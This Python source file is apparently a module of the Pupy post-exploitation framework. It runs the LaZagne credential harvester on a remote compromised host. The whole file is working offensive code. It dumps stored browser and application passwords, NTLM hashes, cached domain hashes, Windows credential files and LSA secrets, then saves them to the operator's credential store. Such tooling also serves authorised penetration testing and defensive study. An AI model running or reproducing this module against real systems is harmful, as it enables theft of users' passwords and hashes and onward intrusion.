# -*- coding: utf-8 -*-
# Author: AlessandroZ

from __future__ import absolute_import
from __future__ import division
from __future__ import print_function
from __future__ import unicode_literals

from pupylib.PupyModule import config, PupyModule, PupyArgumentParser
from pupylib.PupyOutput import Color, NewLine, Section, Hex
from pupylib.utils.credentials import Credentials
from pupylib.utils.rpyc_utils import obtain

from network.lib.convcompat import as_unicode_string_deep, is_binary

import codecs
import ntpath
import traceback

__class_name__ = 'LaZagne'


@config(cat="creds", compat=["linux", "windows"])
class LaZagne(PupyModule):
    """
        retrieve passwords stored on the target
    """

    dependencies = {
        'all:py2': [
            'whole', 'sqlite3', 'xml', 'calendar',
            'ConfigParser', 'lazagne', 'pyasn1'
        ],
        'all:py3': [
            'whole', 'sqlite3', 'xml', 'calendar',
            'lazagne', 'pyasn1', 'asn1crypto'
        ],
        'linux': [
            'secretstorage', 'crypt'
        ],
        'windows': [
            'sqlite3.dll', 'pypykatz'
        ],
    }

    FILTER = ''.join([
        (len(repr(chr(x))) == 3) and chr(x) or '.' for x in range(256)
    ])

    TYPESMAP = {
        'password': 'plaintext',
        'hash': 'hash',
        'key': 'key',
        'cmd': 'cmd',
        'defaultpassword': 'lsa'
    }

    NON_TABLE = set([
        'Ssh', 'Secretstorage', 'Libsecret', 'Cli', 'Credman'
    ])

    FILTER_COLUMNS = set([
        'CredType', 'Category', 'SavePassword'
    ])

    @classmethod
    def init_argparse(cls):
        cls.arg_parser = PupyArgumentParser(
            prog='lazagne', description=cls.__doc__
        )

        cls.arg_parser.add_argument(
            '-p', '--password', help='Specify user password (windows only)'
        )

        cls.arg_parser.add_argument(
            '-d', '--debug', default=False, action='store_true',
            help='Redirect debug prints'
        )

        cls.arg_parser.add_argument(
            'category', nargs='?', help='specify category', default='all'
        )

    def run(self, args):
        write_output = None
        print_debug = None

        try:
            if args.debug:
                write_output = self.client.remote(
                    'lazagne.config.write_output')

                print_debug = write_output.print_debug

                def _log(level, message):
                    message = str(message).strip()
                    self.log('{} | {}'.format(level, message.strip()))

                write_output.print_debug = _log

            self._run(args)

        finally:
            if write_output and print_debug:
                write_output.print_debug = print_debug

    def _run(self, args):
        db = Credentials(client=self.client, config=self.config)

        whole = self.client.remote('whole', 'to_strings_list', False)
        runLaZagne = self.client.remote(
            'lazagne.config.run', 'run_lazagne', False)

        first_user = True
        passwordsFound = False

        kwargs = {
            'raise_on_exception': False,
        }

        if args.category:
            kwargs['category_selected'] = args.category

        if args.password and self.client.is_windows():
            kwargs['password'] = args.password

        results = obtain(whole(runLaZagne, **kwargs))

        for r in results:
            r = as_unicode_string_deep(r, fail=False)

            if r[0] == 'User':
                if not passwordsFound and not first_user:
                    self.warning('no passwords found !')

                first_user = False
                passwordsFound = False
                user = r[1]

                self.log(Section('User: ' + user))

            elif r[2]:
                passwordsFound = True
                try:
                    self.print_results(r[0], r[1], r[2], db)
                except Exception as e:
                    self.error(
                        '{}: {}: {}'.format(r[1], e, traceback.format_exc())
                    )

        if not passwordsFound:
            self.warning('no passwords found !')

    def hashdump_to_dict(self, creds):
        results = []

        for cred in creds:
            for pwd in cred:
                try:
                    user, rid, lm, nt, _, _, _ = pwd.split(':')
                    results.append({
                        'Category': 'hashdump',
                        'CredType': 'hash',
                        'Login': user,
                        'Hash': '%s:%s' % (str(lm), str(nt))
                    })
                except Exception:
                    pass

        return results

    def cachedump_to_dict(self, creds):
        results = []

        for cred in creds:
            for pwd in cred[0]:
                try:
                    user, d, dn, h = pwd.split(':')
                    results.append({
                        'Category': 'cachedump',
                        'CredType': 'hash',
                        'Login': user,
                        'Hash': '%s:%s:%s:%s' % (
                            user.lower(), h.encode('hex'),
                            d.lower(), dn.lower()
                        )
                    })
                except Exception:
                    pass

        return results

    def credfiles_to_dict(self, creds):
        for cred in creds:
            filename = cred['File']
            parts = ntpath.abspath(filename).split('\\')
            # Common format
            if len(parts) == 8 and parts[1].lower() == 'users' and \
                    parts[3].lower() == 'appdata':
                filename = u'{}:{}'.format(parts[2], parts[-1])
                cred['File'] = filename

            for field in ('Username', 'Domain', 'Password'):
                cred[field] = cred[field].strip('\x00')

                if is_binary(cred[field]):
                    cred[field] = Hex(cred[field])

            if cred['Domain'].startswith('Domain:'):
                cred['Domain'] = cred['Domain'][7:]

            cred.update({
                'CredType': 'plaintext',
                'Category': 'Credfiles'
            })

        return creds

    def creds_to_dict(self, creds, module):
        try:
            if module.lower() == 'hashdump':
                return self.hashdump_to_dict(creds)
            elif module.lower() == 'cachedump':
                return self.cachedump_to_dict(creds)
            elif module.lower() == 'credfiles':
                return self.credfiles_to_dict(creds)
        except Exception:
            traceback.print_exc()
            return []

        results = []

        if type(creds) == str:
            raise Exception(creds)

        for cred in creds:
            if isinstance(cred, dict):
                result = {
                    'Category': module
                }

                for c in cred:
                    result[c] = cred[c].strip()

                    for t, name in self.TYPESMAP.items():
                        if t in set([x.lower() for x in result]):
                            result['CredType'] = name

                    if not result.get('CredType'):
                        result['CredType'] = 'empty'

                    results.append(result)

        return results

    def prepare_fields(self, items, remove=[]):
        if not items:
            return [], []

        data = [
            {
                k: v for k, v in item.items() if k not in remove
            } for item in items
        ]

        columns = set()
        for item in items:
            for column in item:
                if column not in remove:
                    columns.add(column)

        return data, columns

    def filter_same(self, creds):
        return [
            dict(t) for t in frozenset([
                tuple(d.items()) for d in creds
            ])
        ]

    def print_lsa(self, creds):
        for idx, cred in enumerate(creds):
            for name, value in cred.items():
                if name in ('Category', 'CredType'):
                    continue

                if idx:
                    self.log(NewLine(lines=0))

                self.log(name)
                self.log(Hex(value))

    def print_results(self, success, module, creds, db):
        if not success:
            self.error(str(creds))
            return

        if not creds or all(not cred for cred in creds):
            return

        self.log(Section('Module: ' + module, level=1))

        creds = self.filter_same(
            self.creds_to_dict(creds, module)
        )

        if module.lower() == 'lsa_secrets':
            self.print_lsa(creds)
        else:
            if module not in self.NON_TABLE:
                self.table(
                    *self.prepare_fields(
                        creds, remove=self.FILTER_COLUMNS))
            else:
                for cred in creds:
                    self.table(
                        [
                            {
                                'KEY': k, 'VALUE': Hex(v)
                                if is_binary(v) else v
                            } for k, v in cred.items()
                            if k not in self.FILTER_COLUMNS
                        ], [
                            'KEY', 'VALUE'
                        ],
                        truncate=True, legend=False, vspace=1
                    )

        try:
            db.add(creds)
        except Exception:
            self.error(traceback.format_exc())

        self.log(NewLine(lines=0))
